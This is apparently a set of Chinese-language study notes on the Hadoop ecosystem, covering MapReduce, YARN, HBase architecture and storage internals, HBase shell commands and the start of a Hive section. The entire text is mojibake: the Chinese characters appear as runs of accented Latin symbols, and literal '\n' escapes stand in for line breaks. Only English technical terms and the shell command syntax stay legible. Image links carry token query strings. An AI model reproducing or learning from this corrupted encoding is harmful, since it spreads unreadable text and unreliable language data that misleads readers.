é«˜åº¦æŠ½è±¡çš„ç¼–ç¨‹æ€æƒ³:ç¼–ç¨‹äººå‘˜åªéœ€è¦æè¿°åšä»€ä¹ˆï¼Œå…·ä½“æ€ä¹ˆåšäº¤ç”±å¤„ç†æ¡†æ¶æ‰§è¡Œçš„\n- å¯æ‰©å±•æ€§:åˆ†å¸ƒå¼ã€æ­å»ºåœ¨é›†ç¾¤ä¸Šçš„ä¸€-ä¸ªå¤„ç†ç»„ä»¶\n- é«˜å®¹é”™æ€§:å¤„ç†ä»»åŠ¡æ—¶èŠ‚ç‚¹æ•…éšœï¼Œè¿ç§»åˆ°å…¶ä»–èŠ‚ç‚¹æ‰§è¡Œä»»åŠ¡MapReduceä»»åŠ¡ä¸»è¦åˆ†ä¸ºä¸¤å¤§éƒ¨åˆ†: mapä»»åŠ¡ã€ reduceä»»åŠ¡\n\n## MapReduceä»»åŠ¡\n- reduceä»»åŠ¡çš„å¤„ç†æ•°æ®æ¥æºæ˜¯mapä»»åŠ¡çš„è¾“å‡º\n- mapé˜¶æ®µ:é’ˆå¯¹æ¯ä¸ªæ•°æ®æ‰§è¡Œä¸€ä¸ªæ“ä½œ, æå–æ•°æ®ç‰¹å¾\n- reduceé˜¶æ®µ:è·å–åˆ°å¤šä¸ªmapçš„è¾“å‡ºï¼Œç»Ÿä¸€è®¡ ç®—å¤„ç†,é’ˆå¯¹keyç»Ÿè®¡æ±‡æ€»è¿™ä¸ªkeyå¯¹åº”çš„value\n\n## Mapé˜¶æ®µè¯¦æƒ…\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151414971.png?token=ARYCSATLAWLW5KMTUFKFGMLCQCNJA)\n\n1. æ•°æ®ä»æ•°æ®æºè·å–åè¿›è¡Œåˆ†ç‰‡åˆ‡åˆ†ã€æ‰§è¡Œmapæ“ä½œ\n2. åˆ†ç‰‡ä¼šè¢«å­˜å‚¨åœ¨ç¯å½¢å†…å­˜ç¼“å†²åŒº( å½“ç¼“å†²åŒºè¾¾åˆ°80%ä¼šå‘ç”Ÿæº¢å†™)\n3. æŠŠåˆ†ç‰‡æº¢å†™åˆ°ç£ç›˜ä¸­ï¼Œç”ŸæˆMOFæ–‡ä»¶\n4. æº¢å†™è¿‡ç¨‹ä¸­å¯¹æ•°æ®æ‰§è¡Œ\n\n## Mapé˜¶æ®µè¯¦æƒ…\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151414178.png?token=ARYCSAQANK6MV3W4IXLU2I3CQCNJY)\n\n1. æŠŠæ•°æ®(MOF)ä»ç£ç›˜ä¸­åŠ è½½åˆ°å†…å­˜ä¸­\n2. å½“æ•°æ®é‡è¿‡å¤§ä¼šæ‰§è¡Œå½’å¹¶ï¼Œå¦‚æœä¸å¤šï¼Œç›´æ¥è·³è¿‡å½’å¹¶æ‰§è¡Œå½’çº¦æ“ä½œ\n3. æ‰§è¡Œå®Œreduceæ“ä½œä¹‹åï¼Œæœ€ç»ˆç»“æœå†™å…¥åˆ°HDFS\n\n\n## è¯é¢‘ç»Ÿè®¡æ¡ˆä¾‹(å•è¯è®¡æ•°WordCount)\n1. æ•°æ®æº(å¾ˆå¤šè‹±æ–‡å¥å­æˆ–çŸ­è¯­çš„ä¸€ä¸ªæ–‡ä»¶)\n2. æå–å‡ºæ¯ä¸ªå•è¯,ç»Ÿè®¡å•è¯å‡ºç°çš„æ¬¡æ•°\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151415672.png?token=ARYCSAXFO4SAXDL2SDP6U2DCQCNMS)\n\n\n## MapReduceç¼ºç‚¹\n- å¤„ç†å»¶è¿Ÿæ€§é«˜\n- ä½¿ç”¨javaè¯­è¨€ç¼–ç¨‹mapå¤„ç†reduceå¤„ç†\n- MapReduceå¤„ç†ä»»åŠ¡éœ€è¦ä½¿ç”¨èµ„æº\n\n## MapReduce V1èµ„æºè°ƒåº¦å‡ºç°çš„é—®é¢˜\n- å¦‚æœå‘ç”Ÿé—®é¢˜ï¼Œé€šçŸ¥ç”¨æˆ·ä»‹å…¥è§£å†³\n- æ²¡æœ‰åŒºåˆ†ä»»åŠ¡è°ƒåº¦å’Œèµ„æºè°ƒåº¦ï¼Œéƒ½æ˜¯MRçš„ä¸»èŠ‚ç‚¹åœ¨å¤„ç†ï¼Œä¸»èŠ‚ç‚¹çš„æ•´ä½“å·¥ä½œå‹åŠ›éå¸¸å¤§\n- å› ä¸ºèµ„æºæ²¡æœ‰å•ç‹¬éš”ç¦»,å®¹æ˜“å‡ºç°èµ„æºæŠ¢å çš„é—®é¢˜\n\n\n# Yarn\n    èµ„æºè°ƒåº¦ç®¡ç†æœåŠ¡---> å¯ä»¥ååŠ©å…¶ä»–ç»„ä»¶åº”ç”¨åè°ƒç®¡ç†èµ„æºï¼Œä»¥åŠä»»åŠ¡è°ƒåº¦\n\n## Yarnçš„ç³»ç»Ÿæ¶æ„\n    åœ¨é›†ç¾¤å±‚é¢æ¥è¯´åªæœ‰ä¸€ä¸ªResourceManager, å¤šä¸ªNodeManager\n    ä»¥ç¨‹åºæ‰§è¡Œå±‚é¢æ¥è¯´ï¼Œä¸€ä¸ªåº”ç”¨åªæœ‰ä¸€-ä¸ªAppMaster,å¤šä¸ªContainer\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151415737.png?token=ARYCSARBIQVH4N564AKKJMLCQCNNI)\n\n- Client:å®¢æˆ·ç«¯\n- ResourceManager (ä¸»èŠ‚ç‚¹) :è´Ÿè´£èµ„æºç®¡ç†,ä»»åŠ¡è°ƒåº¦\n- NodeManager (ä»èŠ‚ç‚¹) :è´Ÿè´£æä¾›èµ„æºï¼Œå®é™…ä»»åŠ¡æ‰§è¡Œ\n- ApplicationMaster:ç‰¹æ®Šçš„Container, ç®¡ç†åŒä¸€åº”ç”¨çš„å…¶ä»–Container,ä»¥åŠå®æ—¶å…³æ³¨ä»»åŠ¡æ‰§è¡ŒçŠ¶æ€,åé¦ˆç»™RM\n- Container:`èµ„æºçš„æŠ½è±¡`ï¼Œè¢«å°è£…èµ·æ¥çš„èµ„æºï¼Œä¸€ä¸ªContaineræ‰§è¡Œä¸€ä¸ªä»»åŠ¡, å…¶ä»–ä»»åŠ¡ä¸èƒ½ä½¿ç”¨è¿™ä¸ªContainerçš„èµ„æº\n\n\n## `MapReduce On Yarnä»»åŠ¡å¤„ç†æµç¨‹`\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151416739.png?token=ARYCSARS5WJ7BORNAHKFOJLCQCNN4)\n\n1. Clientå‘RMå‘èµ·è¯·æ±‚\n2. RM(ApplicationManager)æ¥æ”¶åˆ°è¯·æ±‚ååœ¨NMä¸­å¯åŠ¨ä¸€-ä¸ªAppMaster\n3. AppMasteræ¥æ”¶ä»»åŠ¡ï¼Œæ ¹æ®ä»»åŠ¡å‘RM (ResourceScheduler) ç”³è¯·èµ„æº\n4. åœ¨NMä¸­å°è£…èµ„æºContaineræä¾›ç»™AppMasteræ‰§è¡Œåº”ç”¨\n5. æ‰§è¡Œè¿‡ç¨‹ä¸­Containerä¼šå®æ—¶åé¦ˆæ‰§è¡ŒçŠ¶æ€ç»™AppMaster\n6. AppMasterä¼šåé¦ˆä»»åŠ¡æ‰§è¡ŒçŠ¶æ€å’Œè‡ªèº«çŠ¶æ€ç»™RM (ApplicationManager)\n7. AppMasterå°†è¿è¡Œç»“æœåé¦ˆç»™RM,ç„¶åå‘RM (ResourceScheduler) ç”³è¯·é‡Šæ”¾èµ„æº\n8. RMå°†ä»»åŠ¡æƒ…å†µåé¦ˆç»™Client\n\nYarnæ­å»ºæ—¶æ”¯æŒä¸»å¤‡é…ç½®ï¼Œå®ç°ä¸»å¤‡ResourceManager\nAppMasterçš„å®¹é”™(å½“-ä¸ªAppMasterå‡ºç°æ•…éšœ,ä»»åŠ¡ç®¡ç†ä¼šè¢«è¿ç§»åˆ°æ–°çš„AppMaster)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151416345.png?token=ARYCSAT3PEMWREPF6Y6UIPLCQCNO4)\n\n# HBase\n    HBaseåˆ†å¸ƒå¼åˆ—å¼NoSQLæ•°æ®åº“ï¼Œåº•å±‚å­˜å‚¨ä½¿ç”¨çš„æ˜¯HDFS ,`æ²¡æœ‰æ•°æ®ç±»å‹ï¼Œæ‰€æœ‰æ•°æ®å­˜å‚¨éƒ½æ˜¯å­—èŠ‚æ•°ç»„çš„å½¢å¼byte[]`\n    åˆ›å»ºè€…:é“æ ¼å¡å»·\n    å‡ºå‘ç‚¹:æœç´¢å¼•æ“-->æé«˜æ•°æ®è¯»å†™é€Ÿåº¦--> BigTable\n\n## HBaseçš„ç‰¹æ€§\n- å¯æ‰©å±•æ€§:å¯ä»¥é€šè¿‡æ·»åŠ èŠ‚ç‚¹çš„æ–¹å¼å¢åŠ æ•°æ®å­˜å‚¨ç©ºé—´\n- é«˜å¯é æ€§:åº•å±‚ä½¿ç”¨HDFS,èƒ½å¤Ÿä¿è¯æ•°æ®çš„å¯é æ€§ï¼Œé¢„å†™å¼æ—¥å¿—ä¿è¯å†…å­˜ä¸­çš„æ•°æ®ä¸ä¸¢å¤±\n- é«˜æ€§èƒ½:å¤„ç†PBçº§åˆ«çš„æ•°æ®\n- é¢å‘åˆ—: HBaseæ•°æ®å­˜å‚¨æ˜¯é¢å‘åˆ—çš„\n- å¯ä¼¸ç¼©æ€§:åŠ¨æ€æ·»åŠ åˆ—(åœ¨æ·»åŠ æ•°æ®çš„æ—¶å€™)- \n\n## é¢å‘åˆ—ã€é¢å‘è¡Œæ•°æ®åº“çš„ä¼˜ç¼ºç‚¹\n- é¢å‘è¡Œ:\\\n    ä¼˜ç‚¹:èƒ½æ–¹ä¾¿å¿«æ·çš„è·å–ä¸€ä¸€è¡Œè®°å½•\\\n    ç¼ºç‚¹:åœ¨æƒ³è¦å•ç‹¬è·å–æŒ‡å®šåˆ—æ•°æ®çš„æ—¶å€™ï¼Œä¼šæ£€ç´¢åˆ°å…¶ä»–æ— å…³åˆ—\n- é¢å‘åˆ—:\\\n    ä¼˜ç‚¹:åœ¨æ£€ç´¢å•åˆ—æ•°æ®æ—¶ï¼Œä¸ä¼šå‡ºç°æ— å…³åˆ—\\\n    ç¼ºç‚¹:æƒ³è¦æŸ¥è¯¢ä¸€æ¡è®°å½•æ—¶ï¼Œéœ€è¦å¤šæ¬¡IOè¯·æ±‚æ‰èƒ½æ‹¼å‡ºä¸€æ¡è®°å½•\n  \n\n\n## HBaseå’ŒRDB (å…³ç³»å‹æ•°æ®åº“)çš„åŒºåˆ«æ¯”è¾ƒ\n- æ•°æ®ç´¢å¼•: \\\n  HBaseåªæœ‰ä¸€ ç§ç´¢å¼•(rowkey)ï¼ŒRDBä¸­å¯ä»¥é…ç½®å¤šä¸ªç´¢å¼•\n- æ•°æ®ç»´æŠ¤: \\\n  HBaseå…è®¸æ•°æ®å¢åˆ æŸ¥,`ä¸æ”¯æŒä¿®æ”¹`ï¼ŒRDBä¸­å…è®¸æ•°æ®å¢åˆ æŸ¥æ”¹\\\n  HBaseå¯ä»¥ä½¿ç”¨è¦†ç›–çš„æ–¹å¼å†™å…¥æ•°æ®ä»¥æ­¤å®ç°æ•°æ®ä¿®æ”¹çš„åŠŸèƒ½\nå¯ä¼¸ç¼©æ€§: HBaseå¯ä»¥åœ¨æ·»åŠ æ•°æ®æ—¶åŠ¨æ€æ·»åŠ åˆ—ï¼ŒRDBåªèƒ½é€šè¿‡ä¿®æ”¹è¡¨çš„æ–¹å¼æ·»åŠ åˆ—\nRDB (MySQL) æ•°æ®æ¨¡å‹:æ•°æ®åº“ã€è¡¨ã€è¡Œã€åˆ—(å­—æ®µ)ï¼Œå•å…ƒæ ¼\n\n\n## HBaseæ•°æ®æ¨¡å‹\n    å‘½åç©ºé—´ã€è¡¨ã€è¡Œã€åˆ—(ç»„æˆåˆ—æ—)ã€å•å…ƒæ ¼(å¯ä»¥å­˜å‚¨å¤šæ¡è®°å½•)\n- å‘½åç©ºé—´: hbaseã€ default. è‡ªå®šä¹‰(åœ¨ä½¿ç”¨è‡ªå®šä¹‰çš„å‘½åç©ºé—´æ—¶éƒ½éœ€è¦æŒ‡å®šå‘½åç©ºé—´åç§°)\n- è¡¨:ç”±è¡Œå’Œåˆ—ç»„æˆ\n- è¡Œ:æœ‰ä¸€ä¸ªå”¯ä¸€è¡¨ç¤ºè¡Œé”®(rowkey)\n- åˆ—:å½’å±äºæŸä¸€ä¸ªåˆ—æ—(`åŠ¨æ€æ·»åŠ `)\n- åˆ—æ—:ç”±ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—ç»„æˆ(åˆ›å»ºè¡¨æ—¶åˆ›å»ºçš„ï¼Œä¸èƒ½åŠ¨æ€æ›´æ”¹)\n- å•å…ƒæ ¼:ç”±è¡Œå’Œåˆ—èƒ½ç¡®å®š-ä¸€ä¸ªå•å…ƒæ ¼ï¼Œ`ä¸€ä¸ªå•å…ƒæ ¼ä¸­å¯èƒ½å­˜åœ¨å¤šæ¡è®°å½•(å¤šç‰ˆæœ¬è®°å½•ï¼Œä½¿ç”¨æ—¶é—´æˆ³è¿›è¡ŒåŒºåˆ†)`\n\n## HBaseçš„è¡¨ç»“æ„\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151416733.png?token=ARYCSAXZAIA7GUOAB6GHIRDCQCNPY)\n\n    è¦æ‰¾åˆ°è¡Œåˆ—å¯¹åº”çš„å•å…ƒæ ¼å€¼æ—¶ï¼Œè¡¨è¡Œé”®,åˆ—æ—:åˆ—\n    é»˜è®¤æƒ…å†µä¸‹ï¼Œåªè¿”å›å•å…ƒæ ¼ä¸­çš„æœ€æ–°è®°å½•ï¼Œå¦‚æœè¦è¿”å›å¤šç‰ˆæœ¬éœ€è¦æŒ‡å®šå‚æ•°VERSIONS=>3\n\n## HBaseç³»ç»Ÿæ¶æ„\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151416644.png?token=ARYCSASVT7UT7XUFLMIYFLLCQCNRC)\n\n- Client:ç”¨æˆ·å¯ä»¥é€šè¿‡Clientè¿æ¥åˆ°HBase,åŸºæœ¬ä¸ä¸HMasteräº¤äº’\n- ZooKeeper:ç›‘æµ‹HMasterçš„ä¸»å¤‡è¿è¡ŒçŠ¶æ€åŠä¸»å¤‡åˆ‡æ¢ï¼Œç›‘æµ‹HRegionServerçš„çŠ¶æ€ï¼Œåé¦ˆç»™HMaster,`å­˜å‚¨HBaseå…ƒæ•°æ®ä¿¡æ¯hbase:meta`\n- Hmaster() ï¼šç®¡ç†ç»´æŠ¤HRegionServeråˆ—è¡¨ï¼Œç®¡ç†åˆ†é…Region, Regionè´Ÿè½½å‡è¡¡\n- HRegionServerï¼šç®¡ç†åˆ†é…ç»™å®ƒçš„Regionï¼Œå¤„ç†ç”¨æˆ·çš„è¯»å†™è¯·æ±‚\n- DFS Client: HBaseè¿æ¥åˆ°HDFSçš„æ¥å£\n\nä¸€ä¸ªHRegionserverä¸­åŒ…å«ä¸€ä¸ªHLogï¼Œ å¤šä¸ªHRegion\n\n- HLog:é¢„å†™å¼æ—¥å¿—WAL,è®°å½•æ•°æ®æ“ä½œ(æ•°æ®å†™å…¥ä¹‹å‰å¿…é¡»å…ˆå†™å…¥HLog)\n- Region:`åˆ†å¸ƒå¼å­˜å‚¨çš„æœ€åŸºæœ¬å•ä½ï¼Œåˆšå¼€å§‹ä¸€ä¸ªRegionå­˜å‚¨ä¸€ä¸ªè¡¨çš„å†…å®¹éšç€æ•°æ®å¢å¤š`ï¼ŒRegionä¼šä¸æ–­åˆ†è£‚\\\nStore:ä¸€ä¸ªRegionä¸­åŒ…å«å¤šä¸ªStore,`ä¸€ä¸ªStoreå­˜å‚¨ä¸€ä¸ªåˆ—æ—æ•°æ®`\\\nMemStore (å†™ç¼“å­˜):ä¸€ä¸ªStoreåŒ…å«ä¸€ä¸ªMemStore \\\nStoreFile (ç£ç›˜æ–‡ä»¶):ä¸€ä¸ªStoreä¸­åŒ…å«å¤šä¸ªStoreFile\\\nHFile (HDFSæ–‡ä»¶): ä¸€ä¸ªStoreFileæ·»åŠ å¤´éƒ¨ä¿¡æ¯è½¬æ¢æˆHFile,æœ€ç»ˆå­˜å‚¨åœ¨HDFSä¸­\n\n\n- æ•°æ®å†™å…¥å…³é”®æµç¨‹:å…ˆå†™å…¥HLog,ç„¶åæ‰èƒ½å†™å…¥MemStore,å½“MemStoreè¾¾åˆ°æº¢å‡ºè¦æ±‚(128M) ,å°†æ•°æ®åˆ·å†™StoreFileä¸­\n- æ•°æ®è¯»å–å…³é”®æµç¨‹:å…ˆè¯»å–MemStore,å¦‚æœæ²¡æœ‰,å†è¯»å–BlockCache (è¯»ç¼“å­˜)ï¼Œå¦‚æœè¿˜æ˜¯æ²¡æœ‰æœ€ç»ˆæ‰è¯»å–StoreFile\\\n  BlockCacheå­˜å‚¨ä¹‹å‰çš„ç”¨æˆ·æŸ¥è¯¢è¿‡çš„æ•°æ®ï¼Œå½“MemStoreå’ŒBlockCacheä¸­éƒ½æ²¡æœ‰æ•°æ®ï¼Œ éœ€è¦ä»StoreFile\\\n  ä¸­è¯»å–æ•°æ®æ—¶ï¼Œè¯»å–å®Œçš„æ•°æ®ä¼šè¢«åŠ è½½åˆ°BlockCacheä¸­\n\n## Regionæ‹†åˆ†\n- æ‹†åˆ†åŸå› :æ•°æ®ä¸æ–­å¢åŠ ï¼Œregionä¸æ–­å¢å¤§ï¼Œ regionè¿‡å¤§ä¼šå½±å“æ•°æ®è¯»å†™é€Ÿåº¦\n- æ‹†åˆ†æ¡ä»¶:æ ¹æ®è¡Œé”®æ‹†åˆ†ï¼Œå°½å¯èƒ½å°†åŒä¸€ä¸ªè¡Œé”®æˆ–ç›¸ä¼¼çš„è¡Œé”®æ”¾åœ¨ä¸€ä¸ªRegionä¸­\n-regionæ‹†åˆ†è¿‡ç¨‹å¾ˆå¿«ï¼Œæ¥è¿‘ç¬é—´,åœ¨æ‹†åˆ†æ—¶å®é™…è¿˜æ˜¯è¯·æ±‚çš„åŸæ–‡ä»¶,æ‹†åˆ†ç»“æŸä¹‹åä¼šå°†åŸæ–‡ä»¶å†…å®¹å¼‚æ­¥å†™å…¥æ–°æ–‡ä»¶,ç„¶åä¹‹åçš„è¯·æ±‚è¢«è½¬ç§»åˆ°æ–°æ–‡ä»¶\n\n## Regionå®šä½ \n  å…ƒæ•°æ®ä¿¡æ¯å­˜å‚¨åœ¨hbase:metaä¸­,è¿™ä¸ªè¡¨ä¿¡æ¯è¢«å­˜å‚¨åœ¨zookeeperå†…å­˜ä¸­é€šè¿‡å…ƒæ•°æ®ä¿¡æ¯è·å–Regionå®é™…å­˜å‚¨ä½ç½®\n\n\n## HRegionServerBR\nH RegionServerå‡ºç°æ•…éšœæ—¶\n1. zookeeperå‘ç°RegionServeræ•…éšœï¼ŒåŒæ—¶HMaster\n2. HMasterè·å–æ•…éšœçš„RegionServerä¸Šçš„HLogä¿¡æ¯ï¼Œæ ¹æ®ä¸Regionçš„å¯¹åº”å…³ç³»å¯¹HLogè¿›è¡Œæ‹†åˆ†\n3. æŠŠHLogå­˜æ”¾åœ¨Regionç›®å½•ä¸‹ï¼ŒæŠŠRegioné‡æ–°è¿ç§»è‡³å…¶ä»–çš„RegionServerä¸Š\n4. å…¶ä»–çš„RegionServeræ¥æ”¶åˆ°Regionæ‰§è¡Œé‡æ–°æ‰§è¡ŒHLogå†…å®¹\n\n## HLogçš„å·¥ä½œåŸç†\n- HLog: WALé¢„å†™å¼æ—¥å¿—ï¼Œæ•°æ®æ›´æ–°çš„æ“ä½œéƒ½è¦å…ˆå†™å…¥HLogä¸­ï¼Œæ‰èƒ½å†™å…¥MemStore\\\n`å½“MemStoreè¢«åˆ·å†™åˆ°ç£ç›˜åï¼Œä¼šå‘HLogä¸­å†™å…¥ä¸€æ¡æ ‡è®°è®°å½• (æ ‡è®°è®°å½•ä¹‹å‰çš„æ‰€æœ‰æ•°æ®éƒ½å·²ç»åˆ·å†™åˆ°ç£ç›˜)`\n- ç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œç³»ç»Ÿä»»åŠ¡å…ˆæ‰«æHLog, æ£€æµ‹æ˜¯å¦æœ‰æ•°æ®æ²¡æœ‰å†™å…¥åˆ°ç£ç›˜ä¸­,å¦‚æœæœ‰å…ˆæ‰§è¡Œå†™å…¥MemStore,ç„¶åå†åˆ·å†™åˆ°ç£ç›˜ï¼Œæ¸…ç©ºç¼“å­˜,æœ€åå†ä¸ºç”¨æˆ·æä¾›æœåŠ¡ \\\n  å¦‚æœæ•°æ®ä¸¢å¤±ï¼Œå¯ä»¥æ ¹æ®HLogé‡æ–°æ‰§è¡Œæ¢å¤\n- ä¸€ä¸ªRegionServeråªæœ‰ä¸€-ä¸ªHLog (å…±ç”¨ä¸€ä¸ªHLog)\\\n    ä¼˜ç‚¹:å†™å…¥æ—¥å¿—æ—¶ä¸éœ€è¦æŸ¥æ‰¾å¯¹åº”çš„Log,ç›´æ¥å…¨éƒ¨å†™å…¥ä¸€ä¸ªHLog\\\n    ç¼ºç‚¹:å¦‚æœRegionServerå‡ºç°æ•…éšœï¼Œ éœ€è¦å¯¹HLogè¿›è¡Œæ‹†åˆ†\n\n## ç¼“å­˜åˆ·å†™(æŠŠMemStoreæ•°æ®å†™å…¥åˆ°StoreFileä¸­)\n- å½“MemStoreè¾¾åˆ°åˆ·å†™æ¡ä»¶ï¼Œå°±ä¼šå°†å†…å®¹åˆ·å†™åˆ°StoreFileæ–‡ä»¶ä¸­\n- ç¼“å­˜çš„åˆ·å†™æ˜¯é’ˆå¯¹æ•´ä¸ªRegionçš„ï¼Œå½“ä¸€ä¸ªMemStoreè¾¾åˆ°åˆ·å†™è¦æ±‚ï¼Œ å½“å‰çš„Regionä¸‹é¢çš„æ‰€æœ‰MemStoreéƒ½ä¼šè§¦å‘åˆ·å†™\n- æ¯æ¬¡åˆ·å†™éƒ½ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„StoreFileæ–‡ä»¶(æ¯æ¬¡çš„åˆ·å†™å†…å®¹éƒ½åˆ†åˆ«åœ¨ä¸€ä¸ªæ–°æ–‡ä»¶ä¸­)\n- åˆ·å†™å®Œæˆä¹‹åä¼šåœ¨HLogä¸­å†™å…¥æ ‡è®°è®°å½•,å¹¶ä¸”æ¸…ç©ºç¼“å­˜\n\n## StoreFileçš„åˆå¹¶\n    (åˆ·å†™æ“ä½œä¼šå‡ºç°å¤§é‡çš„StoreFile,ä¸”éƒ¨åˆ†StoreFileæ–‡ä»¶å¤§å°è¿‡å°) åˆå¹¶æ¯”è¾ƒæ¶ˆè€—èµ„æº,è¾¾åˆ°ä¸€å®šé˜ˆå€¼æ‰ä¼šæ‰§è¡Œ\n    å°†å¤šä¸ªçš„StoreFileå°æ–‡ä»¶åˆå¹¶æˆä¸€ä¸ªå¤§æ–‡ä»¶,å¦‚æœStoreFileæ–‡ä»¶è¿‡å¤§ï¼Œå†è¿›è¡Œæ‹†åˆ†(æ ¹æ®HDFSå—è¿›è¡Œæ‹†åˆ†)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151417167.png?token=ARYCSARKZXKFELTQTTNKS2LCQCNSG)\n\nåˆå¹¶æ–‡ä»¶ä¼šè¿›è¡Œç­›é€‰:å¦‚æœæœ¬èº«çš„StoreFileå°±å·²ç»è¾¾åˆ°1 00Må·¦å³,è¿™ä¸ªStoreFileæ˜¯ä¸å‚ä¸åˆå¹¶çš„\n\n## HBaseè¯»å–æµç¨‹\n1. Clientè¯·æ±‚zookeeperè·å–hbase:metaè¡¨å…ƒæ•°æ®ä¿¡æ¯ï¼Œè·å–RegionServerä¿¡æ¯\n2. Clientè¯·æ±‚ç›¸å¯¹åº”çš„RegionServer\n3. RegionServeræ¥æ”¶åˆ°è¯·æ±‚åé¦ˆæ•°æ®ç»™Client\n4. å…³é—­è¯»å–æµ\n\n## HBaseå†™å…¥æµç¨‹\n1. Clientè¯·æ±‚çš„zookeeper,è·å–hbase:metaè¡¨ä¿¡æ¯,æ ¹æ®å†™å…¥çš„è¡Œé”®è·å–å¯¹åº”çš„RegionServerä¿¡æ¯\n2. Clientè¯·æ±‚RegionServerå‘èµ·å†™å…¥è¯·æ±‚\n3. RegionServeræ¥æ”¶åˆ°è¯·æ±‚åå°†æ•°æ®å†™å…¥åˆ°è¡Œé”®å¯¹åº”çš„Regionä¸­.\n4. RegionServeråé¦ˆå†™å…¥çŠ¶æ€ç»™Client\n5. å…³é—­å†™å…¥æµ\n\n## BloomFilter (å¸ƒéš†è¿‡æ»¤å™¨)\n    åˆ¤æ–­æ•°æ®æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœåé¦ˆç»“æœä¸ºä¸å­˜åœ¨ï¼Œæ˜¯å¯ä¿¡çš„ï¼Œå¦‚æœåé¦ˆç»“æœä¸ºå­˜åœ¨ï¼Œå¯èƒ½æœ‰è¯¯å·®\n\nç¼©å°æ•°æ®è¿å–èŒƒå›´\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151417006.png?token=ARYCSAWFZISPZYGSH4D2ZW3CQCNTA)\n\nåœ¨HBaseä¸­è¡Œé”®æ˜¯ä»¥å­—å…¸åºè¿›è¡Œæ’åº\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151417994.png?token=ARYCSASMGZRH33VA4OG27TLCQCNTW)\n\n\n## HBase Shellå‘½ä»¤\n```sql\nnamespace:\n    create_namespace 'åç§°'\n    list_namespace\n    list_namespace_ tables 'ns1'\n    alter_namespace 'ns1 ,{å±æ€§åç§°=> 'å±æ€§å€¼}\n    drop_ namespace 'ns1' ---å‘½åç©ºé—´éœ€è¦æ˜¯ç©ºçš„\n\nddl:æ•°æ®å®šä¹‰è¯­è¨€---> è¡¨å±‚é¢çš„æ“ä½œ\n    create 'è¡¨å',åˆ—æ—å1';åˆ—æ—2'\n    create 'è¡¨å,{NAME= > 'åˆ—æ—' VERSIONS= > 5},{NAME= >åˆ—æ—' ,VERSIONS= >5}\n    ä¿®æ”¹åˆ—æ—å±æ€§ä¿¡æ¯ã€æ·»åŠ åˆ—æ—: alter 'è¡¨å',{NAME=> 'åˆ—æ—' ,VERSIONS=>5}-->å¦‚æœåˆ—æ—å­˜åœ¨åšä¿®æ”¹ï¼Œä¸å­˜åœ¨åšæ·»åŠ \n    ä½¿ç”¨listå¯ä»¥æŸ¥çœ‹æ‰€æœ‰çš„è¡¨:åŒ…å«defaultå‘½åç©ºé—´å’Œè‡ªå®šä¹‰å‘½åç©ºé—´ä¸­çš„è¡¨\n    æŸ¥çœ‹è¡¨ä¿¡æ¯: describe 'è¡¨å'\n    åˆ é™¤è¡¨: drop 'è¡¨åâ€™--> ç¦ç”¨çŠ¶æ€çš„è¡¨æ‰ èƒ½è¿›è¡Œåˆ é™¤\n    ç¦ç”¨è¡¨: disable è¡¨å' /å¯ç”¨è¡¨: enable 'è¡¨å'\n    \ndml:æ•°æ®ç®¡ç†è¯­è¨€--> é’ˆå¯¹æ•°æ®å±‚é¢çš„æ“ä½œ\n    æ·»åŠ æ•°æ®: put 'è¡¨åï¼Œâ€™è¡Œé”®\",åˆ—æ—:åˆ—\",å€¼â€™--> é»˜è®¤ä½¿ç”¨çš„æ˜¯ç³»ç»Ÿæ—¶é—´æˆ³\n    åˆ é™¤æ•°æ®: delete 'è¡¨å\";è¡Œé”®â€™\n    deleteè¡¨å',è¡Œé”®\"ï¼Œåˆ—æ—:åˆ—'\n    deleteè¡¨å';è¡Œé”®\",åˆ—æ—åˆ—,{TIMESTEMP= >'235652'}\n    æ¸…ç©ºè¡¨: truncate 'è¡¨å'\n    æ•°æ®è·å–: get 'è¡¨å';è¡Œé”®â€™\n    get 'è¡¨å'è¡Œé”®\";åˆ—æ—åˆ—\n    get 'è¡¨å'ï¼Œ'è¡Œé”®\";åˆ—æ—åˆ—,{VERSIONS=>3}\n    æ•°æ®æ‰«æ: scan 'è¡¨å'\n    scan 'è¡¨å\"';è¡Œé”®';åˆ—æ—åˆ—,VERSIONS= >3}\n\nsnapshot:å¿«ç…§æ“ä½œ--> é’ˆå¯¹è¡¨åˆ›å»ºå¿«ç…§ï¼Œè®°å½•å½“å‰æŒ‡å®šè¡¨çš„æ•°æ®ä¿¡æ¯\n    åˆ›å»ºå¿«ç…§: snapshot 'è¡¨å\"ï¼Œ'å¿«ç…§åç§°'\n    è¿˜åŸå¿«ç…§: resotre_ snapshot 'å¿«ç…§å'\n    å…‹éš†å¿«ç…§: clone_ snapshot â€˜å¿«ç…§å;æ–°è¡¨å' --->æŠŠå¿«ç…§ä¸­çš„è¡¨å†…å®¹è¿˜åŸåˆ°ä¸€-å¼ æ–°è¡¨ä¸Š\n    åˆ é™¤å¿«ç…§: delete snapshot 'å¿«ç…§å'\n```\n\n\n# Hive\n    æ•°æ®ä»“åº“ï¼ŒæŸ¥è¯¢åˆ†æ\n\n\n## Hadoopç”Ÿæ€åœˆ\n- HDFSå­˜å‚¨ã€ HBaseå­˜å‚¨æä¾›å®æ—¶è¯»å†™åŠŸèƒ½\n- MapReduceå¹¶è¡Œè®¡ç®—ã€Yarnèµ„æºç®¡ç†å’Œä»»åŠ¡è°ƒåº¦\n- ZooKeeperååŠ©åˆ†å¸ƒå¼åº”ç”¨ç®¡ç†æœåŠ¡\n- Hiveåº•å±‚ä½¿ç”¨çš„æ˜¯MapReduceåšè®¡ç®—ï¼ŒMapReduceçš„ä½¿ç”¨å¯¹ç¼–ç¨‹äººå‘˜è¦æ±‚æ¯”è¾ƒé«˜\n- å¯ä»¥æ‰§è¡ŒSQLç±»çš„æŸ¥è¯¢åˆ†æè®¡ç®—\n\n## 